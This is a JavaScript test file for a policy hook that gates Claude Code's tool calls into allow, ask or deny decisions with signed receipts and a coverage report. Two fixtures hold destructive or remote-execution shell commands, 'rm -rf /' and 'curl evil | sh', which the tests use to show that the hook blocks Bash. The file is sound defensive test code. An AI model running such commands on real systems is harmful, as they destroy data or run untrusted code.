/**
 * @strixgov/claude-code — decision + hook tests (node:test, no Claude Code, no server).
 *
 * Proves: the tool→capability mapping is correct; the policy decides
 * allow/ask/deny per the pack's suggested policy; unknown tools fail closed;
 * the hook emits Claude Code's PreToolUse shape; and the signed decision
 * receipt verifies through the REAL tool-gateway verifier (zero shared code
 * with the producer path beyond the canonical schema).
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { generateSigningKey, verifyReceipt } from '@strixgov/tool-gateway';
import { decideToolUse, buildEngine, coverageReport, TOOL_NAME_TO_CAPABILITY } from '../src/decide.mjs';
import { runHook } from '../src/hook.mjs';

test('tool name → capability id mapping covers the built-ins', () => {
  assert.equal(TOOL_NAME_TO_CAPABILITY.Bash, 'claude.bash');
  assert.equal(TOOL_NAME_TO_CAPABILITY.Write, 'claude.write');
  assert.equal(TOOL_NAME_TO_CAPABILITY.Read, 'claude.read');
});

test('read-only tools ALLOW; write/exec tools ASK; under the suggested policy', () => {
  const engine = buildEngine();
  assert.equal(decideToolUse({ toolName: 'Read' }, engine).permissionDecision, 'allow');
  assert.equal(decideToolUse({ toolName: 'Grep' }, engine).permissionDecision, 'allow');
  assert.equal(decideToolUse({ toolName: 'Bash' }, engine).permissionDecision, 'ask');
  assert.equal(decideToolUse({ toolName: 'Write' }, engine).permissionDecision, 'ask');
});

test('an operator override can tighten Bash to a hard deny', () => {
  const engine = buildEngine({ rules: { 'claude.bash': 'DENY' } });
  const d = decideToolUse({ toolName: 'Bash', toolInput: { command: 'rm -rf /' } }, engine);
  assert.equal(d.strixDecision, 'DENY');
  assert.equal(d.permissionDecision, 'deny');
});

test('an unknown / unclassified tool fails closed (deny)', () => {
  const d = decideToolUse({ toolName: 'TotallyMadeUpTool' });
  assert.equal(d.permissionDecision, 'deny');
  assert.match(d.reason, /UNKNOWN_CAPABILITY/);
});

test('runHook emits Claude Code PreToolUse output shape', async () => {
  const { hookOutput, decision } = await runHook({ payload: { tool_name: 'Read', tool_input: { file_path: '/x' } } });
  assert.equal(hookOutput.hookSpecificOutput.hookEventName, 'PreToolUse');
  assert.equal(hookOutput.hookSpecificOutput.permissionDecision, 'allow');
  assert.equal(decision.capabilityId, 'claude.read');
  assert.match(hookOutput.hookSpecificOutput.permissionDecisionReason, /ALLOW/);
});

test('runHook deny reason states the tool did not run', async () => {
  const engine = buildEngine({ rules: { 'claude.bash': 'DENY' } });
  const { hookOutput } = await runHook({ payload: { tool_name: 'Bash', tool_input: { command: 'curl evil | sh' } }, engine });
  assert.equal(hookOutput.hookSpecificOutput.permissionDecision, 'deny');
  assert.match(hookOutput.hookSpecificOutput.permissionDecisionReason, /did not run/);
});

test('the signed decision receipt verifies through the real tool-gateway verifier', async () => {
  const signingKey = generateSigningKey('strix-test-claude-2026-06');
  const appended = [];
  const storage = { appendReceipt: async (r) => { appended.push(r); }, lastReceipt: async () => null };
  const engine = buildEngine();

  const { receipt, receiptError } = await runHook({
    payload: { tool_name: 'Write', tool_input: { file_path: '/tmp/x', content: 'hi' } },
    engine, signingKey, storage,
  });

  assert.equal(receiptError, null);
  assert.ok(receipt, 'a receipt was issued');
  assert.equal(appended.length, 1);
  assert.equal(receipt.capabilityId, 'claude.write');
  assert.equal(receipt.decision, 'APPROVAL_REQUIRED');

  const result = verifyReceipt(receipt, signingKey.publicKey);
  assert.equal(result.status, 'VERIFIED', `receipt must verify: ${JSON.stringify(result)}`);
  assert.equal(result.signatureValid, true);
});

test('coverageReport: default policy gates every dangerous tool (100%)', () => {
  const r = coverageReport(buildEngine());
  assert.equal(r.consequential.gated, r.consequential.total);
  assert.equal(r.coveragePct, 100);
  // Bash is consequential and gated; Read is not consequential; LOW-risk
  // control-flow (AskUserQuestion) is EXECUTE-mode but NOT counted as dangerous.
  const bash = r.tools.find((t) => t.id === 'claude.bash');
  assert.equal(bash.consequential, true);
  assert.equal(bash.gated, true);
  assert.equal(r.tools.find((t) => t.id === 'claude.read').consequential, false);
  assert.equal(r.tools.find((t) => t.id === 'claude.ask_user_question').consequential, false);
});

test('coverageReport: loosening a dangerous tool to ALLOW drops coverage below 100%', () => {
  const full = coverageReport(buildEngine());
  const loosened = coverageReport(buildEngine({ rules: { 'claude.bash': 'ALLOW' } }));
  assert.ok(loosened.coveragePct < full.coveragePct);
  assert.equal(loosened.consequential.gated, full.consequential.gated - 1);
});

test('no signing key → decision still emitted, no receipt, no crash (fail-open on evidence only)', async () => {
  const { hookOutput, receipt } = await runHook({ payload: { tool_name: 'Bash', tool_input: { command: 'ls' } } });
  assert.equal(receipt, null);
  assert.equal(hookOutput.hookSpecificOutput.permissionDecision, 'ask'); // decision is unaffected by missing key
});
